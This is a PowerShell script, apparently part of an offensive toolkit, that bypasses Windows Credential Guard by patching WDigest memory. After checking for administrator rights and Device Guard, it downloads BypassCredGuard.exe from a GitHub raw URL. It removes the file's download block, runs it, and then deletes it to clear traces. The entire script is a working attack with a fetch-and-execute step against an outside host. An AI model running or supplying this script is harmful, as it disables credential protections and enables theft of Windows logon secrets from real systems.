<#
.SYNOPSIS
   Credential Guard Bypass Via Patching Wdigest Memory

.URL
   https://github.com/wh0nsq/BypassCredGuard/releases
#>


## Make sure shell is running with administrator privileges
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
If($IsClientAdmin -iMatch '^(True)$')
{
   ## Make sure Device Guard its configurated to run
   $TestRunning = (Get-ComputerInfo).DeviceGuardSecurityServicesConfigured
   If([string]::IsNullOrEmpty($TestRunning))
   {
      write-host "`n   Error: Device Guard not configurated to run..`n" -ForegroundColor Red
      return
   }

   ## Download (from my github) and Execute binary
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/BypassCredGuard.exe" -OutFile "$pwd\BypassCredGuard.exe"|Unblock-File
   try{
      .\BypassCredGuard.exe
   }Catch{write-host "   Error: fail to execute BypassCredGuard.exe" -ForegroundColor Red}
}
Else
{
   write-host "   Error: Administrator privileges required.." -ForegroundColor Red
   return
}


##CleanUp
If(Test-Path -Path "$pwd\BypassCredGuard.exe")
{
   Remove-Item -Path "$pwd\BypassCredGuard.exe" -Force
}